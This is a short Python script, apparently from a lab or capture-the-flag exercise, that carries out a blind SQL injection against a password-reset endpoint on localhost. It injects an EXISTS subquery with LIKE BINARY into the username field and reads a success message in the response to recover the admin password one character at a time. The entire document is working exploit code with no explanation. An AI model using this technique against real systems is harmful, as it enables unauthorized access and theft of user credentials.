import string
import requests

def query(i):
    return "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE BINARY '"+i+"%') AND ''='"

password=""

while True:
    for i in list(string.printable):
        if "Okay" in str(requests.post("http://localhost:8008/forgot",data={"username":query(password+i)}).text):
            password+=i
            print(password)
            break